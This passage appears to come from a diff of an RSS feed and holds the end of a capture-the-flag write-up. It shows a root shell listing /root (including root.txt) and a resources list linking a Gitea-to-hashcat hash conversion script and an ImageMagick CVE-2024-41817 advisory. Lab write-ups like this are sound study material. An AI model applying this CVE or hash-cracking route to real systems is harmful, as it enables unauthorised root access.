+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">bash&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mf">5.1&lt;/span>&lt;span class="err">#&lt;/span> &lt;span class="nx">ls&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">root&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">cleanup&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">sh&lt;/span> &lt;span class="nx">images&lt;/span> &lt;span class="nx">revert&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">sh&lt;/span> &lt;span class="nx">root&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span> &lt;span class="nx">snap&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/p>
+&lt;h2 id="ressources">Ressources
+&lt;/h2>&lt;blockquote>
+&lt;p>&lt;a class="link" href="https://github.com/hashcat/hashcat/pull/4154/files#diff-ccd519555457fa8e0c74b0dc7bd66727216dd446c7bcff8cd5196fe919e2b000" target="_blank" rel="noopener"
+>gitea2hashcat.py&lt;/a>&lt;br>
+&lt;a class="link" href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8" target="_blank" rel="noopener"
+>Advisory Github for CVE-2024-41817&lt;/a>&lt;/p>&lt;/blockquote></description></item></channel></rss>
